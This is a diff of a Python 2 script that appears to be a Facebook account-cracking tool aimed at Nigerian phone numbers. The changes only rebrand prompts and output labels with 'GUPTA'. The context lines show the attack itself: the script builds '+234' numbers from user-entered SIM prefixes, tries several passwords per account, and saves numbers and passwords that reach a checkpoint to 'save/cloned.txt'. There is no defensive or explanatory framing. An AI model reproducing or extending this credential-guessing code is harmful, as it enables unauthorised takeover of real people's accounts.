@@ -144,7 +144,7 @@ def login():
     pilih_login()
 
 def pilih_login():
-    peak = raw_input("\n\033[1;95m➤ \033[1;93m")
+    peak = raw_input("\n\033[1;95m--➤ \033[1;93m")
     if peak =="":
         print "\x1b[1;97mFill In Correctly"
         pilih_login()
@@ -172,7 +172,7 @@ def action():
         print '\x1b[1;91mEnter any SIM codes for Nigerians >> 907, 906, 706, 710, 714, 811, 911, 711'
         
         try:
-            c = raw_input("\033[1;92mGUPTA➤")
+            c = raw_input("\033[1;97m---GUPTA-➤")
             k="+234"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
@@ -212,7 +212,7 @@ def action():
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(\x1b[1;95mCP) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(\x1b[1;95mGUPTA-CP) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -229,7 +229,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m(\x1b[1;93mCP) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m(\x1b[1;93mGUPTA-CP) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -246,7 +246,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[1;93mcp) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(\x1b[1;93mGUPTA-CP) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
